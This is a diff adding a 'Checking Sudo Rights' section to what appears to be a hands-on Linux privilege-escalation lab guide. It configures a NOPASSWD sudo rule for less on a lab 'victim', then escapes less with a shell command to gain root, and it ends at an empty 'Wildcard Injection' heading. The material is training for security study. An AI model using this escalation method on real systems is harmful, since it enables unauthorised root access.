@@ -118,3 +118,39 @@ sudo /opt/path_lab/backup.sh
 whoami -> root
 ```
 
+## Checking Sudo Rights
+
+#### On the Victim machine - DO THIS
+```
+sudo useradd -m hacker_sudo
+sudo passwd hacker_sudo
+```
+```
+sudo visudo
+```
+Then add : `hacker_sudo ALL=(ALL) NOPASSWD: /usr/bin/less`
+
+Save
+
+#### On the Attacker machine - DO THIS
+
+```
+ssh hacker_sudo@ip
+```
+```
+sudo -l
+```
+You'll see : `(ALL) NOPASSWD: /usr/bin/less`
+
+Now Exploit:
+```
+sudo /usr/bin/less /etc/hosts
+```
+```
+!/bin/bash
+```
+Got root
+
+
+## Wildcard Injection
+
